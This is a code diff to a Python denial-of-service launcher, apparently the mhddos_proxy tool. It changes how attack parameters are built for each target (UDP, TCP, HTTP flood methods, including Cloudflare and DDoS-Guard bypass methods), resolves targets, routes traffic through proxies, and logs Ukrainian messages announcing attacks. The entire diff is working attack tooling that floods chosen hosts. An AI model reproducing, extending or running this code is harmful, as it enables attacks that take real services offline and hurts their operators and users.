@@ -3,31 +3,29 @@ import colorama; colorama.init()
 # @formatter:on
 import queue
 from collections import namedtuple
-from concurrent.futures import Future
+from concurrent.futures import Future, Executor
 from concurrent.futures.thread import _WorkItem
 from threading import Thread, Event
 from time import sleep, time
 
-from yarl import URL
-
 from src.cli import init_argparse
 from src.core import logger, cl, UDP_THREADS, LOW_RPC, IT_ARMY_CONFIG_URL
-from src.dns_utils import resolve_host, get_resolvable_targets
+from src.dns_utils import resolve_all_targets
 from src.mhddos import main as mhddos_main
 from src.output import AtomicCounter, show_statistic, print_banner, print_progress
 from src.proxies import update_proxies
-from src.system import fix_ulimits
+from src.system import fix_ulimits, is_latest_version
 from src.targets import Targets
 
 
-Params = namedtuple('Params', 'url, ip, method, threads')
+Params = namedtuple('Params', 'target, method, threads')
 
 PAD_THREADS = 30
 
 TERMINATE = object()
 
 
-class DaemonThreadPool:
+class DaemonThreadPool(Executor):
     def __init__(self):
         self._queue = queue.SimpleQueue()
 
@@ -70,21 +68,23 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
     threads_per_target = total_threads // len(targets)
     params_list = []
     for target in targets:
-        ip = resolve_host(target)
-        target = URL(target)
-        # UDP
-        if target.scheme == 'udp':
-            params_list.append(Params(target, ip, 'UDP', UDP_THREADS))
-
-        # TCP
-        elif target.scheme == 'tcp':
-            params_list.append(Params(target, ip, 'TCP', threads_per_target))
-
-        # HTTP(S)
-        else:
+        assert target.is_resolved, "Unresolved target cannot be used for attack"
+        # udp://, method defaults to "UDP"
+        if target.is_udp:
+            params_list.append(Params(target, target.method or 'UDP', UDP_THREADS))
+        # Method is given explicitly
+        elif target.method is not None:
+            params_list.append(Params(target, target.method, threads_per_target))
+        # tcp://
+        elif target.url.scheme == "tcp":
+            params_list.append(Params(target, 'TCP', threads_per_target))
+        # HTTP(S), methods from --http-methods
+        elif target.url.scheme in {"http", "https"}:
             threads = threads_per_target // len(http_methods)
             for method in http_methods:
-                params_list.append(Params(target, ip, method, threads))
+                params_list.append(Params(target, method, threads))
+        else:
+            raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
 
     logger.info(f'{cl.YELLOW}Запускаємо атаку...{cl.RESET}')
     statistics = {}
@@ -94,8 +94,11 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
         thread_statistics = {'requests': AtomicCounter(), 'bytes': AtomicCounter()}
         statistics[params] = thread_statistics
         kwargs = {
-            **params._asdict(),
-            'rpc': rpc,
+            'url': params.target.url,
+            'ip': params.target.addr,
+            'method': params.method,
+            'threads': params.threads,
+            'rpc': int(params.target.option("rpc", "0")) or rpc,
             'thread_pool': thread_pool,
             'event': event,
             'statistics': thread_statistics,
@@ -105,7 +108,7 @@ def run_ddos(thread_pool, proxies, targets, total_threads, period, rpc, http_met
         if not table:
             logger.info(
                 f"{cl.YELLOW}Атакуємо{cl.BLUE} %s{cl.YELLOW} методом{cl.BLUE} %s{cl.YELLOW}, потоків:{cl.BLUE} %d{cl.YELLOW}!{cl.RESET}"
-                % (params.url.host, params.method, params.threads))
+                % (params.target.url.host, params.method, params.threads))
 
     if not (table or debug):
         print_progress(period, 0, len(proxies))
@@ -130,7 +133,7 @@ def start(args):
     if args.table:
         args.debug = False
 
-    for bypass in ('CFB', 'DGB', 'BYPASS'):
+    for bypass in ('CFB', 'DGB'):
         if bypass in args.http_methods:
             logger.warning(
                 f'{cl.RED}Робота методу {bypass} не гарантована - атака методами '
@@ -145,14 +148,19 @@ def start(args):
         targets_iter = Targets(args.targets, args.config)
 
     proxies = []
+    is_old_version = not is_latest_version()
     while True:
+        if is_old_version:
+            print(f'{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')
+
         while True:
-            raw_targets = list(targets_iter)
-            if not raw_targets:
+            targets = list(targets_iter)
+            if not targets:
                 logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
                 exit()
 
-            targets = list(get_resolvable_targets(raw_targets, thread_pool))
+            targets = resolve_all_targets(targets, thread_pool)
+            targets = [target for target in targets if target.is_resolved]
             if targets:
                 break
             else:
@@ -165,7 +173,7 @@ def start(args):
                 f'через збільшення кількості перепідключень{cl.RESET}'
             )
 
-        no_proxies = args.vpn_mode or all(target.lower().startswith('udp://') for target in targets)
+        no_proxies = args.vpn_mode or all(target.is_udp for target in targets)
         if no_proxies:
             proxies = []
         else:
